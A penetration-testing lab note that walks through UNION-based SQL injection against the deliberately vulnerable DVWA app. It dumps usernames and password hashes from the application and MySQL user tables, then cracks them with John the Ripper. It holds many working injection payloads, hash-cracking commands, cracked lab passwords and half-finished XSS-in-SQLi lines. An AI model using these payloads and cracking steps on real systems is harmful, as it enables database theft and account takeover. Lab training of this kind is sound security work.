# 02 - Data Collection

Search Tag(s): #sql-injection #union #credential-access-and-dumping #data-exfiltration #dvwa

## 2.1 - Dump Credentials

### 2.1.1 - Current Database Credentials

- This is useful when grabbing the credentials to find a login panel with administrative privileges. Moreover, it is possible to reuse the credentials when facing network protocols. Let's query the credentials from the current database.

```sql
' UNION SELECT user, password FROM users#
```

![[01 - Query Credentials From Current Database.png]]

- Let's concatenate it to organize it nicely.

```sql
' UNION SELECT user || ':' || password, NULL FROM users#

' UNION SELECT concat(user,':',password), NULL FROM users#

' UNION SELECT concat(user,0x3a,password), NULL FROM users#

' UNION SELECT group_concat(user,':',password), NULL FROM users#

' UNION SELECT group_concat(user,0x3a,password), NULL FROM users#

' UNION SELECT concat(user,'~',password), NULL FROM users#

' UNION SELECT group_concat(user,'~',password), NULL FROM users#

' UNION SELECT concat(user,'\n',password), NULL FROM users#

' UNION SELECT concat(user,0x0a,password), NULL FROM users#

' UNION SELECT group_concat(user,0x0a,password), NULL FROM users#
```

![[02 - Harvest Credentials via GROUP_CONCAT From Current Database.png]]

- Copy the concatenated usernames and hashed credentials and output it in a file.

```
$ echo "admin:5f4dcc3b5aa765d61d8327deb882cf99,gordonb:e99a18c428cb38d5f260853678922e03,1337:8d3533d75ae2c3966d7e0d4fcc69216b,pablo:0d107d09f5bbe40cade3de5c71e9e9b7,smithy:5f4dcc3b5aa765d61d8327deb882cf99" | tr "," "\n" > current_db_hashes.txt
```

### 2.1.2 - Crack Current Database Password Hashes

- Let's identify what hash algorithm it uses before we could crack it. Let's run [[Name-That-Hash]].

```
$ nth --no-banner --no-hashcat --text '5f4dcc3b5aa765d61d8327deb882cf99'

5f4dcc3b5aa765d61d8327deb882cf99

Most Likely 
MD5, JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, JtR: raw-md4
NTLM, JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, JtR: mscach

Least Likely
Domain Cached Credentials 2, JtR: mscach2 Double MD5,  Tiger-128,  Skein-256(128),  Skein-512(128),  Lotus Notes/Domino 5, JtR: lotus5 
md5(md5(md5($pass))), Summary: Hashcat mode is only supported in hashcat-legacy. md5(uppercase(md5($pass))),  md5(sha1($pass)),  
md5(utf16($pass)), JtR: dynamic_29 md4(utf16($pass)), JtR: dynamic_33 md5(md4($pass)), JtR: dynamic_34 Haval-128, JtR: haval-128-4 RIPEMD-128, 
JtR: ripemd-128 MD2, JtR: md2 Snefru-128, JtR: snefru-128 DNSSEC(NSEC3),  RAdmin v2.x, JtR: radmin Cisco Type 7,  BigCrypt, JtR: bigcrypt
```

- We will crack the `raw-md5` hashes with [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Password Cracking/Offline/JTR|John The Ripper (JTR)]] with a dictionary attack using `/usr/share/wordlists/rockyou.txt.gz` wordlist.

```
$ sudo gzip -k -d /usr/share/wordlists/rockyou.txt.gz > /usr/share/wordlists/rockyou.txt
```

- All the hashed credentials are cracked.

```
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt current_db_hashes.txt
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (admin)
abc123           (gordonb)
letmein          (pablo)
charley          (1337)
4g 0:00:00:00 DONE (2023-10-04 10:51) 80.00g/s 61440p/s 61440c/s 92160C/s my3kids..dangerous
Warning: passwords printed above might not be all those cracked
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

TODO: Add XSS for easier view

```sql
' UNION SELECT group_concat(user,':',password), <script>alert()</script>, NULL FROM users#

' UNION SELECT group_concat(user,':',password), <hex_encoded_XSS>, NULL FROM users#

' <script>alert(UNION SELECT group_concat(user,':',password), NULL FROM users)</script>#

' <script>alert(UNION SELECT group_concat(user,0x3a,password), NULL FROM users)</script>#
```

### 2.1.3 - MySQL Hashdump

- This will be useful for authenticating the MySQL DBMS server with an exposed port that allows the attacker the harvest the whole database. In addition, sometimes system administrators reuse the credentials which gives the attacker a leverage authenticate it remotely. Run a port scanner with a fingerprinting tool `nmap` to find open ports. Let's query the credentials from the MySQL server database.

```sql
' UNION SELECT user, password FROM mysql.user#
```

![[03 - Query Hashdump Credentials From MySQL Database Server.png]]

```sql
' UNION SELECT user || ':' || password, NULL FROM mysql.user#

' UNION SELECT concat(user,':',password), NULL FROM mysql.user#

' UNION SELECT concat(user,0x3a,password), NULL FROM mysql.user#

' UNION SELECT group_concat(user,':',password), NULL FROM mysql.user#

' UNION SELECT group_concat(user,0x3a,password), NULL FROM mysql.user#

' UNION SELECT concat(user,'~',password), NULL FROM mysql.user#

' UNION SELECT group_concat(user,'~',password), NULL FROM mysql.user#

' UNION SELECT concat(user,'\n',password), NULL FROM mysql.user#

' UNION SELECT concat(user,0x0a,password), NULL FROM mysql.user#

' UNION SELECT group_concat(user,0x0a,password), NULL FROM mysql.user#
```

![[04 - Harvest Hashdump Credentials via GROUP_CONCAT FROM MySQL Database Server.png]]

- Copy the concatenated hashdumped credentials and output it in a file.

```
$ echo "root:*4F56EF3FCEF3F995F03D1E37E2D692D420111476,dvwa:*D7E39C3AF517EC9EF7086223B036E0B4F22821F8" | tr "," "\n" > mysql_hashes.txt
```

### 2.1.4 - Crack MySQL Server Password Hashes

- Let's identify what hash algorithm it uses before we could crack it. Let's run [[Haiti]].

```
$ haiti --john-only "*4F56EF3FCEF3F995F03D1E37E2D692D420111476"
MySQL5.x [JtR: mysql-sha1]
MySQL4.1 [JtR: mysql-sha1]
```

- We will crack the `mysql-sha1` hashes with [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Password Cracking/Offline/JTR|John The Ripper (JTR)]] with a dictionary attack using `/usr/share/wordlists/rockyou.txt` wordlist.

```
$ john --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt mysql_hashes.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
p@ssw0rd         (dvwa)     
1g 0:00:00:01 DONE (2023-10-04 15:27) 0.5617g/s 8057Kp/s 8057Kc/s 8063KC/sa6_123..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

---
## References

- [[Tactics && Techniques && Procedures (TTPs) Phases/Information Gathering/02 - Active Fingerprinting/Enumeration/Network Protocols/SQL Databases/MySQL/Manual|MySQL Active Enumeration]]

- [SecurityIdiots: XSS Injection with SQLi (XSSQLi)](https://www.securityidiots.com/Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html)